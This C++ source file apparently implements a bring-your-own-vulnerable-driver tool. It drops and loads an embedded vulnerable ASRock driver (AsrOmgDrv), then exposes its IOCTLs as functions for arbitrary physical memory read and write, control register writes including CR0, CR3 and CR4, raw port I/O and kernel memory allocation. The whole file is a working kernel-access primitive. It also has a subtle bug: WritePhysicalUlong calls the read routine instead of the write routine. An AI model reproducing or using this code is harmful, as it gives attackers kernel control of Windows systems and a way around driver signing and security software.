#include "DriverFile.h"
#include "Native.h"
#include "Driver.h"

#define DriverServiceName	L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\Vulnerable_AsrOmgDrv_28_09_2012"
#define DriverPath			L"\\SystemRoot\\Vulnerable_AsrOmgDrv_28_09_2012.sys"
#define DeviceName			L"\\Device\\AsrOmgDrv"


typedef struct _IOCTL_ALLOCMEMORY {
	ULONG NumberOfBytes;			//Input
	ULONG PhysicalAddress;			//Output
	ULONGLONG VirtualAddress;		//Output
}IOCTL_ALLOCMEMORY, * PIOCTL_ALLOCMEMORY;
typedef struct _IOCTL_FREEMEMORY {
	ULONGLONG NumberOfBytes;		//Input
	ULONGLONG BaseAddress;			//Input
}IOCTL_FREEMEMORY, * PIOCTL_FREEMEMORY;

typedef struct _IOCTL_READCR {
	ULONGLONG Type;					//Input
	ULONGLONG Data;					//Output
}IOCTL_READCR, * PIOCTL_READCR;
typedef struct _IOCTL_WRITECR {
	ULONGLONG Type;					//Input
	ULONGLONG Data;					//Input
}IOCTL_WRITECR, * PIOCTL_WRITECR;

typedef struct _IOCTL_RWPHYSMEM {
	ULONGLONG PhysicalAddress;		//Input
	ULONG NumberOfValues;			//Input
	ULONG ValueLength;				//Input 1-Byte, 2-Short, 4-Long
	PVOID Buffer;					//Input
}IOCTL_RWPHYSMEM, * PIOCTL_RWPHYSMEM;

typedef struct _IOCTL_INOUT {
	ULONG Port;
	union
	{
		UCHAR Uchar;
		USHORT Ushort;
		ULONG Ulong;
	};
}IOCTL_INOUT, * PIOCTL_INOUT;


CDriver::CDriver() : DeviceHandle(NULL)
{

}
CDriver::~CDriver()
{
	Unload();
}

BOOLEAN CDriver::Load()
{
	if (MySetPrivilege(SE_LOAD_DRIVER_PRIVILEGE, SE_PRIVILEGE_ENABLED) != STATUS_SUCCESS)
		return FALSE;

	if (MyOpenFile(&DeviceHandle, DeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_ATTRIBUTE_DEVICE) == STATUS_SUCCESS)
		return TRUE;

	if (MySaveFileFromMemory(DriverPath, Vulnerable_AsrOmgDrv_28_09_2012, sizeof(Vulnerable_AsrOmgDrv_28_09_2012), NULL) != STATUS_SUCCESS)
		return FALSE;

	if (MyLoadUnloadDriver(DriverServiceName, DriverPath, 1) != STATUS_SUCCESS)
	{
		MyDeleteFile(DriverPath);
		return FALSE;
	}

	if (MyOpenFile(&DeviceHandle, DeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_ATTRIBUTE_DEVICE) != STATUS_SUCCESS)
	{
		MyLoadUnloadDriver(DriverServiceName, NULL);
		MyDeleteFile(DriverPath);
		return FALSE;
	}

	return TRUE;
}
VOID CDriver::Unload()
{
	if (DeviceHandle != NULL)
	{
		NtClose(DeviceHandle);
		MyLoadUnloadDriver(DriverServiceName, NULL);
		MyDeleteFile(DriverPath);
		DeviceHandle = NULL;
	}
}

ULONGLONG CDriver::AllocateMemory(ULONG NumberOfBytes, PULONG PhysicalAddress)
{
	IOCTL_ALLOCMEMORY buffer;
	buffer.NumberOfBytes = NumberOfBytes;
	buffer.PhysicalAddress = 0;
	buffer.VirtualAddress = 0;

	if (MyDeviceIoControl(DeviceHandle, 0x222880, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL) != STATUS_SUCCESS)
	{
		if (PhysicalAddress)
			*PhysicalAddress = NULL;
		return NULL;
	}

	if (PhysicalAddress)
		*PhysicalAddress = buffer.PhysicalAddress;

	return buffer.VirtualAddress;
}
BOOLEAN CDriver::FreeMemory(ULONGLONG BaseAddress, ULONG NumberOfBytes)
{
	IOCTL_FREEMEMORY buffer;
	buffer.BaseAddress = BaseAddress;
	buffer.NumberOfBytes = NumberOfBytes;
	return MyDeviceIoControl(DeviceHandle, 0x222884, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL) == STATUS_SUCCESS;
}

ULONGLONG CDriver::Rdtsc()
{
	ULONGLONG buffer = 0;
	MyDeviceIoControl(DeviceHandle, 0x222864, NULL, NULL, &buffer, sizeof(buffer), NULL);
	return buffer;
}
ULONGLONG CDriver::ReadPmc(ULONG Counter)
{
	ULONGLONG buffer = 0;
	MyDeviceIoControl(DeviceHandle, 0x222868, &Counter, sizeof(Counter), &buffer, sizeof(buffer), NULL);
	return buffer;
}

ULONGLONG CDriver::ReadCr0()
{
	IOCTL_READCR buffer;
	buffer.Type = 0;
	buffer.Data = 0;
	MyDeviceIoControl(DeviceHandle, 0x22286C, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL);
	return buffer.Data;
}
ULONGLONG CDriver::ReadCr2()
{
	IOCTL_READCR buffer;
	buffer.Type = 2;
	buffer.Data = 0;
	MyDeviceIoControl(DeviceHandle, 0x22286C, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL);
	return buffer.Data;
}
ULONGLONG CDriver::ReadCr3()
{
	IOCTL_READCR buffer;
	buffer.Type = 3;
	buffer.Data = 0;
	MyDeviceIoControl(DeviceHandle, 0x22286C, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL);
	return buffer.Data;
}
ULONGLONG CDriver::ReadCr4()
{
	IOCTL_READCR buffer;
	buffer.Type = 4;
	buffer.Data = 0;
	MyDeviceIoControl(DeviceHandle, 0x22286C, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL);
	return buffer.Data;
}
ULONGLONG CDriver::KeGetCurrentIrql()
{
	IOCTL_READCR buffer;
	buffer.Type = 8;
	buffer.Data = 0;
	MyDeviceIoControl(DeviceHandle, 0x22286C, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL);
	return buffer.Data;
}
BOOLEAN CDriver::WriteCr0(ULONGLONG Value)
{
	IOCTL_WRITECR buffer;
	buffer.Type = 0;
	buffer.Data = Value;
	return MyDeviceIoControl(DeviceHandle, 0x222870, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}
BOOLEAN CDriver::WriteCr2(ULONGLONG Value)
{
	IOCTL_WRITECR buffer;
	buffer.Type = 2;
	buffer.Data = Value;
	return MyDeviceIoControl(DeviceHandle, 0x222870, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}
BOOLEAN CDriver::WriteCr3(ULONGLONG Value)
{
	IOCTL_WRITECR buffer;
	buffer.Type = 3;
	buffer.Data = Value;
	return MyDeviceIoControl(DeviceHandle, 0x222870, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}
BOOLEAN CDriver::WriteCr4(ULONGLONG Value)
{
	IOCTL_WRITECR buffer;
	buffer.Type = 4;
	buffer.Data = Value;
	return MyDeviceIoControl(DeviceHandle, 0x222870, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}

BOOLEAN CDriver::InByte(USHORT Port, PUCHAR Value)
{
	IOCTL_INOUT buffer;
	buffer.Port = Port;
	buffer.Uchar = *Value;
	if (MyDeviceIoControl(DeviceHandle, 0x222810, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL) != STATUS_SUCCESS)
		return FALSE;

	*Value = buffer.Uchar;
	return TRUE;
}
BOOLEAN CDriver::OutByte(USHORT Port, UCHAR Value)
{
	IOCTL_INOUT buffer;
	buffer.Port = Port;
	buffer.Uchar = Value;
	return MyDeviceIoControl(DeviceHandle, 0x222814, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL) == STATUS_SUCCESS;
}
BOOLEAN CDriver::InWord(USHORT Port, PUSHORT Value)
{
	IOCTL_INOUT buffer;
	buffer.Port = Port;
	buffer.Ushort = *Value;
	if (MyDeviceIoControl(DeviceHandle, 0x222818, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL) != STATUS_SUCCESS)
		return FALSE;

	*Value = buffer.Ushort;
	return TRUE;
}
BOOLEAN CDriver::OutWord(USHORT Port, USHORT Value)
{
	IOCTL_INOUT buffer;
	buffer.Port = Port;
	buffer.Ushort = Value;
	return MyDeviceIoControl(DeviceHandle, 0x22281C, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL) == STATUS_SUCCESS;
}
BOOLEAN CDriver::InDword(USHORT Port, PULONG Value)
{
	IOCTL_INOUT buffer;
	buffer.Port = Port;
	buffer.Ulong = *Value;
	if (MyDeviceIoControl(DeviceHandle, 0x222820, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL) != STATUS_SUCCESS)
		return FALSE;

	*Value = buffer.Ulong;
	return TRUE;
}
BOOLEAN CDriver::OutDword(USHORT Port, ULONG Value)
{
	IOCTL_INOUT buffer;
	buffer.Port = Port;
	buffer.Ulong = Value;
	return MyDeviceIoControl(DeviceHandle, 0x222824, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL) == STATUS_SUCCESS;
}

BOOLEAN CDriver::WritePhysicalBytes(ULONGLONG PhysicalAddress, PUCHAR Values, ULONG Count)
{
	IOCTL_RWPHYSMEM buffer;
	buffer.Buffer = Values;
	buffer.ValueLength = 1;
	buffer.NumberOfValues = Count;
	buffer.PhysicalAddress = PhysicalAddress;
	return MyDeviceIoControl(DeviceHandle, 0x22280C, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}
BOOLEAN CDriver::WritePhysicalUshorts(ULONGLONG PhysicalAddress, PUSHORT Values, ULONG Count)
{
	IOCTL_RWPHYSMEM buffer;
	buffer.Buffer = Values;
	buffer.ValueLength = 2;
	buffer.NumberOfValues = Count;
	buffer.PhysicalAddress = PhysicalAddress;
	return MyDeviceIoControl(DeviceHandle, 0x22280C, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}
BOOLEAN CDriver::WritePhysicalUlongs(ULONGLONG PhysicalAddress, PULONG Values, ULONG Count)
{
	IOCTL_RWPHYSMEM buffer;
	buffer.Buffer = Values;
	buffer.ValueLength = 4;
	buffer.NumberOfValues = Count;
	buffer.PhysicalAddress = PhysicalAddress;
	return MyDeviceIoControl(DeviceHandle, 0x22280C, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}

BOOLEAN CDriver::ReadPhysicalBytes(ULONGLONG PhysicalAddress, PUCHAR Values, ULONG Count)
{
	IOCTL_RWPHYSMEM buffer;
	buffer.Buffer = Values;
	buffer.ValueLength = 1;
	buffer.NumberOfValues = Count;
	buffer.PhysicalAddress = PhysicalAddress;
	return MyDeviceIoControl(DeviceHandle, 0x222808, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}
BOOLEAN CDriver::ReadPhysicalUshorts(ULONGLONG PhysicalAddress, PUSHORT Values, ULONG Count)
{
	IOCTL_RWPHYSMEM buffer;
	buffer.Buffer = Values;
	buffer.ValueLength = 2;
	buffer.NumberOfValues = Count;
	buffer.PhysicalAddress = PhysicalAddress;
	return MyDeviceIoControl(DeviceHandle, 0x222808, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}
BOOLEAN CDriver::ReadPhysicalUlongs(ULONGLONG PhysicalAddress, PULONG Values, ULONG Count)
{
	IOCTL_RWPHYSMEM buffer;
	buffer.Buffer = Values;
	buffer.ValueLength = 4;
	buffer.NumberOfValues = Count;
	buffer.PhysicalAddress = PhysicalAddress;
	return MyDeviceIoControl(DeviceHandle, 0x222808, &buffer, sizeof(buffer), NULL, NULL, NULL) == STATUS_SUCCESS;
}

BOOLEAN CDriver::WritePhysicalByte(ULONGLONG PhysicalAddress, UCHAR Value)
{
	return WritePhysicalBytes(PhysicalAddress, &Value, 1);
}
BOOLEAN CDriver::WritePhysicalUshort(ULONGLONG PhysicalAddress, USHORT Value)
{
	return WritePhysicalUshorts(PhysicalAddress, &Value, 1);
}
BOOLEAN CDriver::WritePhysicalUlong(ULONGLONG PhysicalAddress, ULONG Value)
{
	return ReadPhysicalUlongs(PhysicalAddress, &Value, 1);
}

BOOLEAN CDriver::WritePhysical(ULONGLONG PhysicalAddress, PVOID Buffer, ULONG BufferSize)
{
	return WritePhysicalBytes(PhysicalAddress, (PUCHAR)Buffer, BufferSize);
}
BOOLEAN CDriver::ReadPhysical(ULONGLONG PhysicalAddress, PVOID Buffer, ULONG BufferSize)
{
	return ReadPhysicalBytes(PhysicalAddress, (PUCHAR)Buffer, BufferSize);
}
